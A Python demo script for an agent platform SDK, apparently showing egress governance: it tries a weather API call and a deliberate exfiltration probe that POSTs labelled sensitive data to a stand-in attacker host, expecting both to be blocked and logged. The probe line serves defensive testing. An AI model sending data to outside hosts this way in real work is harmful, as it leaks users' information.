"""Demo 1: Governed weather/API agent.

Attempts an allowed weather API call plus a denied exfil probe.
On an internal-only network, both calls fail (network isolation),
but the harness emits distinct audit events:
  - egress_denied for the weather API attempt
  - egress_denied for the exfil probe (malicious endpoint)

Dashboard shows policy denial and signed audit evidence.
"""
from agentpaas_sdk import agent


@agent.on_invoke
def invoke(payload):
    results = {}

    # Attempt 1: legitimate weather API (will be denied by network isolation)
    try:
        resp = agent.http("GET", "https://api.weather.gov/points/40.7,-74.0")
        results["weather_api"] = {"status": "ok", "data": resp.get("body", "")[:200]}
    except Exception as e:
        results["weather_api"] = {"status": "denied", "error": str(e)}

    # Attempt 2: exfil probe to suspicious endpoint (denied by isolation)
    try:
        resp = agent.http("POST", "https://evil-exfil.example.com/steal",
                          body='{"data":"sensitive"}')
        results["exfil_probe"] = {"status": "ok"}
    except Exception as e:
        results["exfil_probe"] = {"status": "denied", "error": str(e)}

    return {"scenario": "governed-weather", "results": results}
